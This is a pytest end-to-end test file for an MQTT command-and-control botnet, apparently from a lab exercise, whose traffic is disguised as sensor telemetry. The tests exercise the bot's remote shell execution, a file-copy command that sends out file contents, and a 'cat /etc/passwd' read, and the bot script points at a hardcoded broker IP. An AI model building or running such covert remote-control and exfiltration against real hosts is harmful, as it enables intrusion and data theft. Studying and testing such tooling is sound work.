"""
End-to-end tests for the MQTT C&C botnet with layered protocol stack.
Assumes the MQTT broker is running on 127.0.0.1:1883.

The tests automatically launch and teardown the bot process.

Run with: pytest test_e2e.py -v
"""
import pytest
import json
import time
import hashlib
import threading
import queue
import tempfile
import os
import subprocess
import sys
import zlib
import base64
import uuid
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# Import the protocol stack directly for testing
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from protocol import ProtocolStack, DEFAULT_SALT

# --- CONFIGURATION ---
BROKER = "127.0.0.1"
PORT = 1883
TOPIC = "sensors"
SALT = DEFAULT_SALT

# Path to the bot script
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
BOT_SCRIPT = os.path.join(SCRIPT_DIR, "bot.py")
VENV_PYTHON = os.path.join(SCRIPT_DIR, "venv", "bin", "python")
PYTHON_EXECUTABLE = VENV_PYTHON if os.path.exists(VENV_PYTHON) else sys.executable


class TestClient:
    """Test client using the protocol stack."""
    
    def __init__(self, client_id="test_controller_001"):
        self.client_id = client_id
        self.responses = queue.Queue()
        self.all_messages = queue.Queue()
        
        self.stack = ProtocolStack(
            node_id=client_id,
            broker=BROKER,
            port=PORT,
            topic=TOPIC,
            salt=SALT,
            send_interval=0.5  # Faster for testing
        )
        self.stack.on_receive(self._on_message)
    
    def _on_message(self, message: dict):
        """Handle incoming messages."""
        self.all_messages.put(message)
        
        if message.get("type") == "response" and message.get("target") == self.client_id:
            self.responses.put(message)
    
    def connect(self):
        self.stack.start()
        time.sleep(0.5)  # Wait for connection
    
    def disconnect(self):
        self.stack.stop()
    
    def send_command(self, target: str, cmd: str, arg: str = ""):
        """Send a command."""
        self.stack.send(target, "command", cmd=cmd, arg=arg)
    
    def wait_for_response(self, timeout: float = 10) -> dict:
        """Wait for a response."""
        try:
            return self.responses.get(timeout=timeout)
        except queue.Empty:
            return None
    
    def clear_queues(self):
        """Clear pending messages."""
        while not self.responses.empty():
            try:
                self.responses.get_nowait()
            except queue.Empty:
                break
        while not self.all_messages.empty():
            try:
                self.all_messages.get_nowait()
            except queue.Empty:
                break


@pytest.fixture(scope="session")
def bot_process():
    """Launch the bot process for the test session."""
    bot_test_script = os.path.join(SCRIPT_DIR, "_test_bot.py")
    
    # Read and modify bot script for testing
    with open(BOT_SCRIPT, 'r') as f:
        bot_code = f.read()
    
    # Replace broker for localhost testing
    bot_code = bot_code.replace('BROKER = "147.32.82.209"', 'BROKER = "127.0.0.1"')
    
    with open(bot_test_script, 'w') as f:
        f.write(bot_code)
    
    # Launch bot
    proc = subprocess.Popen(
        [PYTHON_EXECUTABLE, bot_test_script],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=SCRIPT_DIR
    )
    
    time.sleep(3)  # Wait for bot to initialize with protocol stack
    
    yield proc
    
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
    
    if os.path.exists(bot_test_script):
        os.remove(bot_test_script)


@pytest.fixture
def test_client(bot_process):
    """Provide a connected test client."""
    client = TestClient()
    client.connect()
    client.clear_queues()
    yield client
    client.disconnect()


class TestBasicCommands:
    """Tests for basic commands."""
    
    def test_ping_command(self, test_client):
        """Test ping returns Pong."""
        test_client.send_command("ALL", "ping")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None, "Should receive response"
        assert response["output"] == "Pong"
    
    def test_id_command(self, test_client):
        """Test id command."""
        test_client.send_command("ALL", "id")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert "uid=" in response["output"]
    
    def test_w_command(self, test_client):
        """Test w command."""
        test_client.send_command("ALL", "w")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert len(response["output"]) > 0
    
    def test_ls_command(self, test_client):
        """Test ls command."""
        test_client.send_command("ALL", "ls", "/tmp")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert len(response["output"]) > 0
    
    def test_exec_command(self, test_client):
        """Test exec command."""
        test_client.send_command("ALL", "exec", "echo 'hello123'")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert "hello123" in response["output"]
    
    def test_unknown_command(self, test_client):
        """Test unknown command."""
        test_client.send_command("ALL", "unknowncmd")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert "Unknown Cmd" in response["output"]


class TestFileCopy:
    """Tests for file copy command."""
    
    def test_copy_small_file(self, test_client):
        """Test copying a small file."""
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
            f.write("small file content")
            temp_path = f.name
        
        try:
            test_client.send_command("ALL", "copy", temp_path)
            response = test_client.wait_for_response(timeout=10)
            
            assert response is not None
            assert "FILE_START:" in response["output"]
            assert "small file content" in response["output"]
        finally:
            os.unlink(temp_path)
    
    def test_copy_nonexistent_file(self, test_client):
        """Test copying nonexistent file."""
        test_client.send_command("ALL", "copy", "/nonexistent/path.txt")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert "File not found" in response["output"]
    
    def test_copy_large_file(self, test_client):
        """Test copying a large file that requires chunking."""
        # Create a 10KB file
        large_content = "X" * 10000 + "\nEND_MARKER"
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
            f.write(large_content)
            temp_path = f.name
        
        try:
            test_client.send_command("ALL", "copy", temp_path)
            # Large files need more time due to chunking
            response = test_client.wait_for_response(timeout=30)
            
            assert response is not None, "Should receive response for large file"
            assert "FILE_START:" in response["output"]
            assert "END_MARKER" in response["output"], "Should receive complete file"
        finally:
            os.unlink(temp_path)
    
    def test_copy_very_large_file(self, test_client):
        """Test copying a very large file (50KB+)."""
        # Create a 50KB file with identifiable content
        content_parts = [f"LINE_{i:05d}:" + "Y" * 100 + "\n" for i in range(500)]
        large_content = "".join(content_parts)
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
            f.write(large_content)
            temp_path = f.name
        
        try:
            test_client.send_command("ALL", "copy", temp_path)
            # Very large files need even more time
            response = test_client.wait_for_response(timeout=120)
            
            assert response is not None, "Should receive response for very large file"
            assert "FILE_START:" in response["output"]
            # Check first and last lines are present
            assert "LINE_00000:" in response["output"], "Should have first line"
            assert "LINE_00499:" in response["output"], "Should have last line"
        finally:
            os.unlink(temp_path)


class TestTargeting:
    """Tests for command targeting."""
    
    def test_all_target(self, test_client):
        """Test ALL target is received."""
        test_client.send_command("ALL", "ping")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
    
    def test_wrong_target_ignored(self, test_client):
        """Test wrong target is ignored."""
        test_client.send_command("sensor_0000", "ping")
        response = test_client.wait_for_response(timeout=5)
        
        assert response is None, "Should not receive response for wrong target"


class TestProtocolStack:
    """Tests for protocol stack internals."""
    
    def test_chunk_size_calculation(self):
        """Test chunk size is calculated correctly."""
        stack = ProtocolStack(
            node_id="test",
            broker=BROKER,
            port=PORT,
            topic=TOPIC,
            salt=SALT
        )
        
        chunk_size = stack.get_chunk_size()
        assert chunk_size > 128, f"Chunk size should be > 128, got {chunk_size}"
        assert chunk_size < 4096, f"Chunk size should be < 4096, got {chunk_size}"
    
    def test_compression_reduces_size(self):
        """Test that compression reduces payload size."""
        import zlib
        
        # Repetitive content compresses well
        original = "AAAA" * 1000
        compressed = zlib.compress(original.encode(), level=6)
        
        assert len(compressed) < len(original), "Compression should reduce size"
        assert len(compressed) < len(original) / 10, "Highly repetitive content should compress >10x"
    
    def test_encrypt_decrypt_roundtrip(self):
        """Test encryption/decryption roundtrip."""
        # Simulate the encryption layer
        salt = DEFAULT_SALT
        data = {
            "sensor_id": "test",
            "temp": 25.0,
            "hum": 50.0,
            "bat": 100
        }
        
        # Derive key
        raw_str = (salt + str(data.get("sensor_id", "")) + 
                   str(data.get("temp", "")) + 
                   str(data.get("hum", "")) + 
                   str(data.get("bat", "")))
        md5_hash = hashlib.md5(raw_str.encode()).digest()
        key = md5_hash + md5_hash
        
        # Encrypt
        plaintext = "Test message for encryption"
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
        encrypted_hex = (iv + ciphertext).hex()
        
        # Decrypt
        encrypted_data = bytes.fromhex(encrypted_hex)
        iv2 = encrypted_data[:16]
        ciphertext2 = encrypted_data[16:]
        cipher2 = AES.new(key, AES.MODE_CBC, iv2)
        decrypted = unpad(cipher2.decrypt(ciphertext2), AES.block_size).decode()
        
        assert decrypted == plaintext


class TestChunking:
    """Tests for message chunking and reassembly."""
    
    def test_small_message_single_chunk(self, test_client):
        """Small messages should use single chunk."""
        test_client.send_command("ALL", "ping")
        response = test_client.wait_for_response(timeout=10)
        
        # Ping response is small, should work fine
        assert response is not None
        assert response["output"] == "Pong"
    
    def test_large_response_multi_chunk(self, test_client):
        """Large responses should be chunked and reassembled."""
        # Use exec to generate large output
        test_client.send_command("ALL", "exec", "cat /etc/passwd")
        response = test_client.wait_for_response(timeout=15)
        
        assert response is not None
        # /etc/passwd should have root entry
        assert "root" in response["output"]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
